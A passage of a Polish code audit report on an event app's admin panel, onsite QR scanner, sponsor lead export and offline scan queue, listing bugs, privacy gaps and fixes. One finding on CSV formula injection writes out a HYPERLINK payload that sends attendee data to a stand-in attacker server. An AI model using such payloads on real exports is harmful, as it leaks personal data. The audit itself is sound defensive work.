`{row.floor === "" ? row.location_note : row.floor}` — `event_rooms.floor` jest kolumną nullowalną (`floor text` z CHECK `event_rooms_floor_len CHECK (floor IS NULL OR ...)`, 20260823140000_event_sessions.sql:335 i 342), a `admin_event_rooms_list` zwraca ją surowo (`r.id, r.event_id, r.name, r.capacity, r.floor, r.location_note`, tamże:1148). Dla sali bez podanego piętra warunek jest fałszem i renderowany jest `row.floor`, czyli `null` — React nie rysuje niczego. Wskazówka `location_note` („wejście od strony parku", „winda B" — cel kolumny wg komentarza tamże:1355) nie jest dostępna nigdzie w panelu poza formularzem edycji. Ten sam wzorzec obok: `row.capacity > 0 ? ... : capacityUnknown` (linia 121) traktuje salę o pojemności 0 jak salę o nieznanej pojemności, choć CHECK `event_rooms_capacity_positive` i tak zera nie dopuszcza.

**Scenariusz.** Kongres w budynku bez numeracji pięter: organizator wypełnia wyłącznie `location_note = "wejście od strony parku, winda B"`. Lista sal pokazuje samą nazwę i pustą linię pod nią — informacja, dla której kolumna powstała, jest niewidoczna w jedynym ekranie, który sale wypisuje.

**Naprawa.** `{row.floor === null || row.floor === "" ? row.location_note : row.floor}` — albo lepiej pokazywać obie wartości połączone separatorem, bo piętro i wskazówka dojścia to dwie różne informacje, a nie alternatywa.

**Weryfikacja.** src/components/admin/events/organisms/AgendaRoomsPanel.tsx:117 `{row.floor === "" ? row.location_note : row.floor}`. Kolumna jest nullowalna: supabase/migrations/20260823140000_event_sessions.sql:335 `floor text,` z CHECK `event_rooms_floor_len CHECK (floor IS NULL OR char_length(btrim(floor)) BETWEEN 1 AND 60)` (tamże:341), a `admin_event_rooms_list` zwraca ją surowo (tamże:1148 `r.id, r.event_id, r.name, […]

### [średni] Zapisy na sesję nie mają w panelu żadnego ekranu — martwe RPC, hooki i słownik błędów

`src/lib/events/useEventSessions.ts:140` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`useSessionSignups` (linia 140) i `useSetSessionSignup` (linia 274) nie mają konsumentów w żadnym komponencie; to samo dotyczy `useReorderSessions` (linia 185). Po stronie bazy stoją za nimi w pełni zbudowane `admin_event_session_signups_list` z pozycją na liście rezerwowej (20260823140000_event_sessions.sql:2200) i `admin_event_session_signup_set` z jawną zgodą na przekroczenie limitu (`session_full: % of % seats taken - use force to exceed the limit`, tamże:2994). Słownik ma komplet komunikatów tej ścieżki: `sessionFull`, `personNotFound`, `tierRequired`, `overlapConflict` (src/lib/i18n-admin-event-agenda.ts:471-474). Rodzaj kolizji `overbooked` z raportu (20260824084741_...sql:405-424) informuje o przekroczeniu limitu, ale organizator nie ma gdzie kliknąć, żeby zobaczyć KTO jest zapisany ani kogo wypisać. Osobno: `admin_event_session_signup_set` nie sprawdza kolizji czasowej mimo istniejącego dla niej klucza `overlapConflict` — organizator ręcznie zapisując uczestnika może stworzyć […]

**Scenariusz.** Sesja warsztatowa ma `capacity = 20` i 24 zapisy, bo redaktor obniżył limit po otwarciu zapisów. Raport kolizji pokazuje wiersz `overbooked` („oczekiwane 20 / faktyczne 24"), ale w całym studiu nie ma ekranu, na którym da się zobaczyć listę zapisanych albo kogokolwiek przenieść na listę rezerwową. Jedyna droga to konsola SQL.

**Naprawa.** Dodać zakładkę „Zapisy" w dialogu/na trasie szczegółu sesji: lista z `useSessionSignups` (status, pozycja w kolejce) plus akcje `useSetSessionSignup` z potwierdzeniem `force` przy błędzie `session_full`. Do `admin_event_session_signup_set` dopisać tę samą kontrolę kolizji co w `event_session_signup`, z furtką `force`.

**Weryfikacja.** `rg -n "useSessionSignups|useSetSessionSignup|useReorderSessions" src/` zwraca WYŁĄCZNIE definicje: src/lib/events/useEventSessions.ts:140, :185, :274 - zero konsumentów w komponentach. Baza jest kompletna: `admin_event_session_signups_list` (20260824084741_...:261) i `admin_event_session_signup_set` z furtką `force` (20260823140000_event_sessions.sql:2993-2998: `RAISE EXCEPTION 'session_full: % of % seats taken - […]

### [niski] Panel kolizji rysuje puste wiersze „Inna sesja:” i „Podmiot:” dla trzech z czterech rodzajów kolizji

`src/components/admin/events/organisms/AgendaConflictsPanel.tsx:68` · blad · weryfikacja: POTWIERDZONE

`{row.other_session_id === "" ? null : (...)}` i `{row.subject_name === "" ? null : (...)}` (linie 68 i 74). RPC zwraca dla członów `outside_event_window`, `capacity_over_room` i `overbooked` jawne `NULL::uuid` / `NULL::text` w kolumnach `other_session_id`, `other_title_pl`, `other_title_en` (20260824084741_...sql:370, 388, 405-409), a `subject_name` jest NULL-em dla `overbooked` (linia 409) oraz dla `speaker_overlap` prelegenta bez konta (LEFT JOIN po `spf.user_id`, linia 354). `null === ""` jest fałszem, więc oba bloki się renderują, a `pick(row.other_title_pl, row.other_title_en)` (linia 24) zwraca `null` — czyli na ekranie zostaje sama etykieta z dwukropkiem.

**Scenariusz.** Wydarzeniu zwężono okno czasowe, więc raport ma trzy wiersze `outside_event_window`. Każdy z nich pokazuje pod nazwą sesji dwie osierocone linie: „Inna sesja:" i „Podmiot: Kongres XYZ" — pierwsza bez żadnej treści. Organizator czyta to jako brakujące dane i zgłasza błąd wczytywania, zamiast poprawić godziny wydarzenia.

**Naprawa.** Zamienić oba predykaty na sprawdzenie nullowalności: `row.other_session_id === null || row.other_session_id === ""` oraz `row.subject_name === null || row.subject_name === ""`. Ta sama poprawka dotyczy `row.expected_value > 0` (linia 80), które dla `speaker_overlap` przypadkiem działa poprawnie tylko dlatego, że `null > 0` jest fałszem.

**Weryfikacja.** src/components/admin/events/organisms/AgendaConflictsPanel.tsx:68 `{row.other_session_id === "" ? null : (...)}` i :74 `{row.subject_name === "" ? null : (...)}`. RPC podaje w tych kolumnach jawne NULL-e: `outside_event_window` ma `NULL::uuid, NULL::text, NULL::text` (supabase/migrations/20260824084741_...:371), `capacity_over_room` tak samo (tamże:390), `overbooked` ma NULL i w `other_*`, i w `subject_*` […]

---

## Onsite

> Podsystem stoi na dwoch rozlacznych plaszczyznach: panelu (admin_* za assert_editor_tenant/assert_admin_tenant) i urzadzenia (event_* za haszem tokenu). Model tokenu urzadzenia jest solidny: 24 losowe bajty z gen_random_bytes w base64url, w bazie wylacznie SHA-256, grant kolumnowy ukrywa hasz przed rola authenticated, expires_at jest NOT NULL, revoke dziala natychmiast przy pierwszym _event_scanner_device_auth, a licznik nieudanych rozpoznan blokuje urzadzenie po 20 probach w 10 minut. Kryterium E7 "powtorny skan odrzucany" jest realnie wymuszone w silniku (dwa ograniczenia EXCLUDE USING gist event_checkins_no_double_in/out, czesciowy UNIQUE na client_scan_uid, okno dedupe_range z triggera). Kryterium "partner widzi wylacznie wlasne leady" jest poprawne w RPC (event_lead_scans_list nie przyjmuje sponsor_id, RLS wpuszcza tylko staff), ale nie ma dla niego zadnego ekranu - funkcja jest wolana wylacznie z testow. Najwieksze realne dziury: rotacja kodow QR uczestnikow przy kazdym wydaniu partii identyfikatorow, brak jakiegokolwiek dostarczenia kodu QR uczestnikowi, wyciek tozsamosci […]

### [wysoki] Czas urzadzenia trafia do INSERT-u nieprzyciety - skan z telefonu ze spieszacym zegarem konczy sie twardym bledem

`supabase/migrations/20260823180000_event_onsite.sql:1681` · blad · weryfikacja: POTWIERDZONE

W _event_checkin_write wartosc czasu urzadzenia jest przycinana tylko do zmiennej pomocniczej: `v_at := COALESCE(_device_at, now()); IF v_at > now() THEN v_at := now(); END IF;` (linie 1632-1637), ale do tabeli idzie surowy argument: `... scanned_at, device_scanned_at, ... ) VALUES ( ... now(), _device_at, ...)` (linia 1681). Tabela ma CHECK `event_checkins_device_time_sane` (linia 564): `device_scanned_at <= scanned_at + interval '2 minutes'`. Komentarz w kodzie twierdzi wprost 'CHECK dopuszcza dwie minuty luzu na rozjazd zegarow; wyzej przycinamy' - przycinanie nie dotyczy jednak kolumny, ktora CHECK sprawdza. Dodatkowo trigger tg_event_checkins_set_dedupe_range (linia 636) liczy okno z `COALESCE(NEW.device_scanned_at, NEW.scanned_at)`, czyli z wartosci SUROWEJ, podczas gdy krok 5 szuka wiersza w oknie przez `c.dedupe_range @> v_at` z wartoscia PRZYCIETA - dwa mechanizmy pracuja na dwoch roznych znacznikach czasu.

**Scenariusz.** Wolontariusz ma telefon z zegarem spieszacym sie o 5 minut. Kazde pikniecie wola event_checkin_record z device_scanned_at = now()+5min; INSERT lamie CHECK event_checkins_device_time_sane i wraca surowy blad 'new row for relation event_checkins violates check constraint'. isRetryable() (src/lib/events/useScanner.ts:417) nie rozpozna w nim prefiksu odmowy, wiec skan idzie do kolejki i jest ponawiany 8 razy, po czym […]

**Naprawa.** Przekazac do INSERT-u wartosc przycieta (v_at) zamiast _device_at, albo przyciac argument na wejsciu: `_device_at := LEAST(COALESCE(_device_at, now()), now())` przed krokiem 2. Wtedy trigger, okno idempotencji i CHECK operuja na jednej wartosci.

**Weryfikacja.** Sprawdzilem obie wersje funkcji, w tym NAJNOWSZA (20260824102541 nie dotyka, ale 20260824102000_737778c5...sql:76-300 przedeklarowuje _event_checkin_write). W obu przycinanie dotyczy tylko zmiennej: 20260824102000...sql:144-147 (`v_at := COALESCE(_device_at, now()); IF v_at > now() THEN v_at := now(); END IF;`), a INSERT wstawia surowy argument - 20260824102000...sql:179-186 (`... scanned_at, device_scanned_at ... […]

### [wysoki] Eksport leadow dla sponsora oddaje imie, nazwisko, firme i stanowisko osob, ktore NIE wyrazily zgody

`supabase/migrations/20260828080509_557b177c-e978-40c8-94ab-9935d3b7e2ae.sql:284` · bezpieczenstwo · weryfikacja: POTWIERDZONE

admin_event_lead_scans_export bramkuje zgoda wylacznie adres i telefon: `CASE WHEN p.consent_partner_sharing_at IS NOT NULL AND p.consent_withdrawn_at IS NULL THEN p.email END` (linie 287-291), natomiast `p.first_name`, `p.last_name`, `COALESCE(NULLIF(btrim(p.company_text),''), co.name)` i `p.job_title` (linie 284-286) ida BEZWARUNKOWO. To jest dokladnie odwrotnosc tego, co robi plaszczyzna urzadzenia: event_lead_scans_list (supabase/migrations/20260823180000_event_onsite.sql:2380-2400) maskuje first_name, last_name, company i job_title tym samym warunkiem co kontakt, a naglowek migracji (linie 62-70) deklaruje, ze bez zgody sponsor dostaje wiersz do policzenia, ale NIE dostaje tozsamosci. Plik z tego eksportu jest budowany po to, zeby przekazac go sponsorowi - kolumny 'Imie', 'Nazwisko', 'Firma', 'Stanowisko' sa w nim na stale (src/lib/events/leadExport.ts:20-36, 67-83).

**Scenariusz.** Uczestnik odmawia zgody na przekazanie danych partnerom, ale podchodzi do stoiska i pozwala zeskanowac identyfikator (albo skanuje go obsluga bez pytania). Organizator klika 'Eksportuj' w OnsiteLeadsPanel z filtrem po tym sponsorze (src/components/admin/events/organisms/OnsiteLeadsPanel.tsx:66-78) i wysyla plik sponsorowi. Sponsor dostaje imie, nazwisko, firme i stanowisko osoby, ktora zgody nie udzielila - komplet […]

**Naprawa.** Owinac first_name, last_name, company i job_title tym samym CASE co email i phone, dokladnie jak w event_lead_scans_list. Ewentualnie oddawac dla wiersza bez zgody jedynie liczniki i znacznik czasu.

**Weryfikacja.** admin_event_lead_scans_export (20260828080509_557b177c...sql:282-296) oddaje `p.first_name`, `p.last_name`, COALESCE(company_text, co.name) i `p.job_title` BEZWARUNKOWO, a warunek zgody obejmuje tylko email (:287-288) i phone (:289-290). Plaszczyzna urzadzenia robi odwrotnie - event_lead_scans_list maskuje tym samym warunkiem takze first_name, last_name, company i job_title […]

### [wysoki] Kolejka offline kasuje skany bez sladu po uniewaznieniu albo wygasnieciu poswiadczenia

`src/lib/events/scannerOutbox.ts:153` · blad · weryfikacja: POTWIERDZONE

withFailure zaczyna sie od `if (isPermanentFailure(message)) return withoutItem(queue, id);` (linia 153), a PERMANENT_HEADS (linie 55-65) zawiera invalid_device_token, device_revoked, device_inactive, device_expired, device_scope_missing, device_checkpoint_mismatch, checkpoint_not_found, invalid_payload, invalid_direction. Pozycja znika z kolejki calkowicie - nie ma stanu 'odrzucona', nie ma zadnego rejestru, a ScannerOutboxPanel pokazuje tylko to, co w kolejce zostalo. Komentarz w naglowku pliku (linie 23-26) obiecuje cos innego: 'takie pozycje zdejmujemy z kolejki i pokazujemy operatorowi'. Rownoczesnie useScanner na te sama sytuacje nie reaguje statusem: flush() po `invalidatesSession(error)` tylko `return` (src/lib/events/useScanner.ts:257), a submitCheckin/submitLead tylko `throw error` (:337, :382) - status sesji zostaje 'ready', ekran skanera dziala dalej, poswiadczenie nie jest czyszczone (clearStoredToken wolane wylacznie w connect(), :166).

**Scenariusz.** Koordynator gubi telefon, administrator uniewaznia jego poswiadczenie. Ten sam telefon (albo drugi z tym samym tokenem wpisanym recznie) ma w kolejce 40 skanow z hali bez zasiegu. Po powrocie sieci pierwszy element dostaje 'device_revoked', withFailure kasuje go z kolejki, flush przerywa przebieg, po 15 sekundach interwal probuje znowu i kasuje kolejny - po dziesieciu minutach cala kolejka zniknela, a operator caly […]

**Naprawa.** Nie kasowac pozycji przy odmowie poswiadczenia - oznaczac ja stanem trwalym (np. attempts = OUTBOX_MAX_ATTEMPTS + lastError) tak, zeby trafila do 'wymaga uwagi' w ScannerOutboxPanel; kasowanie zostawic wylacznie akcji discard() operatora. Rownolegle w useScanner: przy invalidatesSession ustawiac status 'expired' i zatrzymywac przyjmowanie nowych skanow.

**Weryfikacja.** withFailure kasuje pozycje bezpowrotnie: src/lib/events/scannerOutbox.ts:152-154 (`if (isPermanentFailure(message)) return withoutItem(queue, id);`), lista PERMANENT_HEADS :56-66 obejmuje device_revoked, device_expired, ale takze checkpoint_not_found i invalid_payload. Nie ma stanu 'odrzucona' - ScannerOutboxPanel renderuje wylacznie to, co zostalo w kolejce (ScannerOutboxPanel.tsx:66-100, stuckItems liczone z tej […]

### [średni] Brak ekranu wlasnych leadow sponsora - kryterium odbioru E7 nie ma jak zostac sprawdzone przez uzytkownika

`src/components/events/scanner/organisms/ScannerLeadPanel.tsx:33` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

event_lead_scans_list jest zaimplementowane poprawnie i bezpiecznie (supabase/migrations/20260823180000_event_onsite.sql:2326: brak argumentu sponsor_id, wlasciciel wyprowadzony z poswiadczenia, warunek zywej zgody nad kolumnami tozsamosci) i ma gotowego klienta (src/lib/events/scannerApi.ts:298 fetchDeviceLeads wraz z typami LeadRow/LeadListPage). Ani jedno wywolanie tego klienta nie istnieje poza src/lib/events/**tests**/publicEventApi.test.ts:156. ScannerLeadPanel importuje wylacznie ScannerCodeInput i runtime.submitLead - panel skanuje i zapisuje, ale niczego nie wypisuje; ScannerApp (linia 139) renderuje tylko ten panel dla trybu 'lead'. Ta sama sytuacja dotyczy podgladu decyzji: resolveCheckinScan (scannerApi.ts:188) tez ma wywolanie wylacznie w tescie, mimo ze migracja opisuje go jako obowiazkowy krok dla punktu w trybie 'control' ('operator musi zobaczyc decyzje PRZED wpuszczeniem', linie 1920-1924).

**Scenariusz.** Obsluga stoiska konczy dzien i chce zobaczyc, kogo zeskanowala - w aplikacji skanera nie ma takiego ekranu. Jedyna droga do listy prowadzi przez organizatora i eksport z panelu, czyli przez te sama sciezke, ktora obchodzi maskowanie tozsamosci bez zgody (patrz osobne ustalenie). Kryterium odbioru E7 'partner widzi wylacznie wlasne leady' jest spelnione w bazie, ale nieosiagalne dla partnera.

**Naprawa.** Dolozyc do ScannerLeadPanel zakladke/liste opartana fetchDeviceLeads (z paginacja limit/offset, ktora RPC juz przyjmuje) i pokazac liczniki total_count / with_consent_count, ktore funkcja zwraca. Dla trybu control wpiac resolveCheckinScan jako krok podgladu przed submitCheckin.

**Weryfikacja.** Potwierdzam martwe sciezki: `fetchDeviceLeads` (src/lib/events/scannerApi.ts:298) i `resolveCheckinScan` (:188) maja w calym src/ dokladnie po jednym wywolaniu - w tescie src/lib/events/**tests**/publicEventApi.test.ts:156 i :123. ScannerApp renderuje dla trybu 'lead' wylacznie ScannerLeadPanel (ScannerApp.tsx:138), a ten panel importuje tylko ScannerCodeInput i runtime.submitLead (ScannerLeadPanel.tsx:14-45) - […]

### [średni] Edytor ukladu identyfikatora nie istnieje - wydruk ignoruje szablon poza rozmiarem, tlem i rozmiarem QR

`src/lib/events/badgePrintDocument.ts:46` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Migracja definiuje uklad identyfikatora jako liste blokow z zamknietym slownikiem rodzajow (text | field | image | qr | sponsors | spacer) i pol (first_name, last_name, full_name, company, job_title, ticket_name, group_name, event_title, event_dates), z walidacja per element w admin_event_badge_template_save (supabase/migrations/20260823180000_event_onsite.sql:775-860 oraz :3706). W kodzie 'elements' wystepuje wylacznie jako przelot typu w src/lib/events/onsiteApi.ts:584 i :610 - BadgeTemplateDialog.tsx nie ma dla niego zadnego pola (dialog oferuje tylko nazwe, format, orientacje, wymiary, QR, tlo, skladanie, domyslnosc), a cardHtml (badgePrintDocument.ts:46-68) rysuje uklad zaszyty na sztywno: tytul wydarzenia, imie i nazwisko, stanowisko, firma, znacznik grupy, bilet, QR. buildBadgePrintDocument przyjmuje z szablonu wylacznie widthMm, heightMm, showQr, qrSizeMm i backgroundColor (OnsiteBadgePrintPanel.tsx:129-138) - background_image_url i double_fold z szablonu nie sa uzywane […]

**Scenariusz.** Organizator zapisuje szablon 'Prelegent ze smycza' z tlem graficznym i wlasnym ukladem blokow (dane docieraja do bazy przez RPC), po czym drukuje partie - z drukarki wychodzi ten sam generyczny uklad co dla uczestnika, bez tla i bez zdefiniowanych blokow. Roznica jest widoczna dopiero po wydrukowaniu nakladu.

**Naprawa.** Albo dobudowac edytor blokow i render elements w badgePrintDocument (wraz z background_image_url i double_fold), albo - jesli uklad ma pozostac staly - usunac kolumne elements z kontraktu RPC i z dialogu, zeby panel nie obiecywal konfiguracji, ktorej nie ma.

**Weryfikacja.** cardHtml rysuje uklad zaszyty na sztywno - tytul, imie i nazwisko, stanowisko, firma, znacznik grupy, bilet, QR (src/lib/events/badgePrintDocument.ts:46-68). W calym src/ (poza niepowiazanym eventPageTemplates.ts) `elements` wystepuje tylko jako przelot typu w src/lib/events/onsiteApi.ts:584 i :610 - grep po src/components/admin/events/ nie znajduje ani jednego pola edycji. Potwierdzam takze martwe pola szablonu: […]

### [średni] Eksport leadow do CSV bez zabezpieczenia przed wstrzyknieciem formuly - notatka pochodzi z plaszczyzny anonimowej

`src/lib/csv/formatCsv.ts:16` · bezpieczenstwo · weryfikacja: POTWIERDZONE

csvCell cytuje komorke wylacznie wtedy, gdy zawiera przecinek, cudzyslow albo znak nowej linii: `return /[",\n]/.test(v) ? ... : v;`. Nie ma zadnej neutralizacji wiodacych znakow =, +, -, @, TAB i CR, ktore Excel i LibreOffice traktuja jako poczatek formuly. Do eksportu leadow wchodzi kolumna 'Notatka' (src/lib/events/leadExport.ts:78) pochodzaca z event_lead_scans.note, ktore zapisuje event_lead_scan_record - funkcja z grantem dla roli anon (supabase/migrations/20260823180000_event_onsite.sql:2306), przyjmujaca dowolny tekst do 2000 znakow bez filtru tresci (:2222). Plik jest budowany po to, zeby wyjsc z systemu do sponsora i do organizatora.

**Scenariusz.** Ktos z waznym tokenem stoiska (albo ktokolwiek, kto ten token przechwycil) zapisuje lead z notatka `=HYPERLINK("https://zly.serwer/?d="&A2&B2&F2,"Odblokuj")`. Organizator eksportuje leady do CSV i otwiera plik w Excelu - komorka renderuje sie jako klikalny odnosnik wynoszacy imie, nazwisko i adres poczty z sasiednich komorek na obcy serwer. Wariant z `=cmd|...` jest starszy, ale w polskich instalacjach Excela wciaz […]

**Naprawa.** W csvCell poprzedzac apostrofem (albo cytowac i poprzedzac) kazda wartosc zaczynajaca sie od =, +, -, @, TAB lub CR. Poprawka jest jednym miejscem dla calego repo, bo toCsv jest wspolne dla wszystkich eksportow.

**Weryfikacja.** csvCell w src/lib/csv/formatCsv.ts:16-19 cytuje wylacznie przy /[",\n]/ i nie neutralizuje wiodacych =,+,-,@,TAB,CR. Szukalem zabezpieczenia gdzie indziej i ono W REPO ISTNIEJE, ale w innym module: src/lib/crm/csv.ts:32 `const FORMULA_LEAD = /^[=+\-@\t\r]/` i :60 `const guarded = FORMULA_LEAD.test(raw) ? \`'${raw}\` : raw;` - eksport leadow importuje jednak wersje nieutwardzona (src/lib/events/leadExport.ts:10 […]

### [średni] ON DELETE SET NULL na kluczach obcych, ktore CHECK czyni obowiazkowymi - usuniecie sesji albo sponsora wywala sie surowym bledem bazy

`supabase/migrations/20260823180000_event_onsite.sql:230` · blad · weryfikacja: POTWIERDZONE

event_checkpoints ma jednoczesnie CHECK `event_checkpoints_session_required` (linia 219: `kind <> 'session' OR session_id IS NOT NULL`) i klucz obcy `event_checkpoints_session_fk ... ON DELETE SET NULL` (linia 230). Ta sama para wystepuje dla sponsora: CHECK `event_checkpoints_sponsor_required` (linia 221) plus `event_checkpoints_sponsor_fk ... ON DELETE SET NULL` (linia 234). Analogicznie w event_scanner_devices: CHECK `event_scanner_devices_lead_needs_sponsor` (linia 382) plus `event_scanner_devices_sponsor_fk ... ON DELETE SET NULL` (linia 396). Kaskada SET NULL prowadzi zawsze do wiersza, ktorego CHECK nie dopuszcza.

**Scenariusz.** Redaktor tworzy punkt odprawy rodzaju 'session' dla sesji plenarnej, potem sesje odwoluje i usuwa przez admin_event_session_delete (supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:28). DELETE wyzwala SET NULL na event_checkpoints.session_id, co lamie event_checkpoints_session_required i konczy sie 'new row for relation event_checkpoints violates check constraint'. adminOnsiteFailure […]

**Naprawa.** Zmienic te trzy klucze obce na ON DELETE RESTRICT i dodac w admin_event_session_delete / usuwaniu sponsora jawne sprawdzenie z czytelnym komunikatem (wzorem 'session_has_signups'), albo dopuscic degradacje: trigger, ktory przy SET NULL zmienia jednoczesnie kind punktu na 'zone' i zdejmuje zakres 'lead' z urzadzenia.

**Weryfikacja.** Sprzecznosc jest w kodzie dokladnie tam, gdzie wskazano: event_checkpoints ma CHECK event_checkpoints_session_required (20260823180000_event_onsite.sql:218-219) i rownoczesnie event_checkpoints_session_fk ... ON DELETE SET NULL (:228-229); ta sama para dla sponsora - CHECK :221-222 i FK :232-233; w event_scanner_devices CHECK event_scanner_devices_lead_needs_sponsor (:381-382) i sponsor_fk ON DELETE SET NULL […]

### [średni] Podsystem onsite nie ma ani jednego testu pgtap - oba kryteria odbioru E7 sa niesprawdzane

`supabase/tests/README.md:1` · brak-testow · weryfikacja: POTWIERDZONE

Wyszukanie event_checkins, event_scanner_devices, event_lead_scans, event_checkin_record i event_badge_prints w calym katalogu supabase/tests/ nie zwraca zadnego pliku, mimo ze katalog zawiera ponad piecdziesiat testow innych podsystemow (m.in. community_events_test.sql, community_events_waitlist_test.sql, event_admin_only_contract_test.sql, definer_header_tenant_isolation_test.sql). Nie ma wiec testu dla: ograniczen EXCLUDE event_checkins_no_double_in/out, czesciowego UNIQUE na client_scan_uid, polityki RLS event_lead_scans_staff_read, maskowania tozsamosci bez zgody w event_lead_scans_list, bramki _event_scanner_device_auth (revoke / expiry / scope / lock) ani izolacji najemcow w plaszczyznie urzadzenia. Po stronie frontu brakuje testu dla scannerOutbox (src/lib/events/**tests**/ zawiera badgeSheet, leadExport i scannerPlane, ale nie kolejke offline).

**Scenariusz.** Kazda przyszla zmiana okna idempotencji, warunku zgody albo polityki RLS na event_lead_scans przechodzi bez sygnalu. Konkretnie: gdyby ktos dodal polityke INSERT/SELECT dla roli anon na event_lead_scans (co jest naturalnym odruchem, skoro plaszczyzna urzadzenia dziala jako anon), zaden test tego nie zatrzyma, a skutkiem jest wyciek wszystkich leadów wszystkich sponsorow jednym SELECT-em.

**Naprawa.** Dopisac supabase/tests/event_onsite_test.sql pokrywajacy: (1) drugi granted w oknie punktu odrzucony przez EXCLUDE, (2) powtorzone wyslanie tego samego client_scan_uid oddaje ten sam wiersz, (3) event_lead_scans_list z tokenem sponsora A nie zwraca leadów sponsora B ani obcego najemcy, (4) osoba bez zgody wraca z pustym imieniem/nazwiskiem/kontaktem, (5) token uniewazniony, wygasly, spauzowany i bez zakresu daje […]

**Weryfikacja.** grep po event_checkins, event_scanner_devices, event_lead_scans, event_checkin_record, event_badge_prints i event_checkpoints w calym supabase/tests/ (100 plikow) nie zwraca ANI JEDNEGO pliku. Sprawdzilem takze, czy nie lapie tego bramka ogolna: event_admin_only_contract_test.sql:33-40 i :49-59 enumeruje pg_policies dla tabel `event%`, ale wylapuje tylko polityki wymieniajace 'editor' albo 'admin' bez is_super_admin […]

### [średni] Uczestnik nigdy nie dostaje swojego kodu QR - lancuch odprawy nie domyka sie end-to-end

`src/lib/events/publicRegistrationApi.ts:162` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

event_register zwraca jawny token wejsciowy dokladnie raz i klient go parsuje: `qrToken: nullableText(source, "qr_token")` (linia 162, typ w linii 38). Pole nie ma jednak ANI JEDNEGO konsumenta w kodzie produkcyjnym - grep po 'qrToken' w src/ daje wylacznie publicRegistrationApi.ts i dwa pliki testowe. Ekran potwierdzenia (src/components/events/registration/RegistrationConfirmation.tsx:56-98) pokazuje i kopiuje wylacznie manageToken. W src/lib/email-templates/ nie wystepuje ciag 'qr' ani razu, wiec zaden mail transakcyjny kodu nie niesie. W efekcie jedyna droga, ktora w ogole wypuszcza dzialajacy kod do czlowieka, to admin_event_badge_batch, czyli wydruk identyfikatora w recepcji.

**Scenariusz.** Uczestnik zapisuje sie online, dostaje potwierdzenie mailem, przychodzi na wydarzenie i nie ma czego przylozyc do skanera - nie otrzymal zadnego kodu. Odprawa mozliwa jest wylacznie recznie (admin_event_checkin_manual, zrodlo name_search), czyli dokladnie tak, jak przed etapem E7. Rownoczesnie token wygenerowany przy rejestracji zyje w bazie jako hasz, ktorego nikt nigdy nie uzyje, i jest po cichu nadpisywany przy […]

**Naprawa.** Pokazac kod QR na ekranie potwierdzenia (RegistrationConfirmation) i/lub dolozyc go do maila potwierdzajacego w registrationSelfNotify - z zastrzezeniem, ze token wraca raz, wiec obraz QR trzeba wygenerowac z odpowiedzi event_register, zanim zniknie z pamieci strony. Alternatywnie wystawic osobne RPC 'wydaj mi kod' za manage_token, zeby uczestnik mogl odzyskac kod ze strony zarzadzania zapisem.

**Weryfikacja.** Sprawdzilem szeroko i potwierdzam brak konsumenta: `qrToken` z src/lib/events/publicRegistrationApi.ts:38 i :162 wystepuje w src/ wylacznie w tym pliku oraz w testach (publicRegistration.test.ts:243, publicRegistrationForm.test.tsx:160). Ekran potwierdzenia pokazuje i kopiuje wylacznie manageToken (RegistrationConfirmation.tsx:56-98). Sciezka mailowa niesie manage_token, nie kod wejscia - […]

### [średni] Walidacja punktu odprawy w kliencie nie pokrywa trzech ograniczen CHECK - blad wraca jako nierozpoznany komunikat bazy

`src/lib/events/onsiteDraft.ts:233` · niespojnosc · weryfikacja: POTWIERDZONE

validateCheckpointDraft sprawdza pojemnosc tylko pod katem formatu liczby (`if (intOrNull(draft.capacity) === false)`, linia 233), a intOrNull dopuszcza zero (`parsed >= 0`, linia 63). Baza wymaga trzech rzeczy wiecej: `event_checkpoints_capacity_positive` (capacity > 0, migracja 20260823180000_event_onsite.sql:203), `event_checkpoints_capacity_needs_control` (capacity dozwolone tylko przy access_mode = 'control', linia 207) oraz `event_checkpoints_dedupe_window_range` (BETWEEN 5 AND 86400, linia 213) - klient sprawdza wylacznie gorna granice okna (`dedupe > CHECKPOINT_MAX_DEDUPE_SECONDS`, linia 237). checkpointDraftToInput przekazuje pojemnosc niezaleznie od trybu (linia 249), dialog pokazuje pole pojemnosci zawsze (src/components/admin/events/molecules/EventCheckpointDialog.tsx:172), a admin_event_checkpoint_save nie czysci pojemnosci przy trybie 'track' (migracja, linie 2631-2653).

**Scenariusz.** Redaktor konfiguruje punkt statystyczny przy kawiarni: tryb 'track' (licz, nie blokuj) i pojemnosc 150. Zapis odbija sie od event_checkpoints_capacity_needs_control, adminOnsiteFailure nie znajduje klucza i18n dla 'new row for relation ...' i pokazuje 'errors.unknown'. To samo przy pojemnosci 0 i przy oknie idempotencji ustawionym na 2 sekundy.

**Naprawa.** W validateCheckpointDraft dolozyc: pojemnosc > 0, pojemnosc dozwolona tylko dla accessMode === 'control', dedupe >= 5. W checkpointDraftToInput zerowac capacity dla trybu 'track', a w dialogu ukrywac to pole poza trybem control (tak jak juz robi to dla sessionId/sponsorId zaleznie od kind).

**Weryfikacja.** validateCheckpointDraft sprawdza pojemnosc tylko na ksztalt liczby (src/lib/events/onsiteDraft.ts:233-235), a intOrNull przepuszcza zero (:59-64, `parsed >= 0`); okno idempotencji ma tylko gorna granice (:236-239), brak dolnej granicy 5 s. Baza wymaga wiecej: event_checkpoints_capacity_positive (20260823180000_event_onsite.sql:203), event_checkpoints_capacity_needs_control (:206-208) i […]

### [niski] Powody wydruku wysylane z panelu sa spoza slownika bazy, a przycisk druku w recepcji niczego nie drukuje

`src/components/admin/events/organisms/OnsiteDeskPanel.tsx:102` · niespojnosc · weryfikacja: POTWIERDZONE

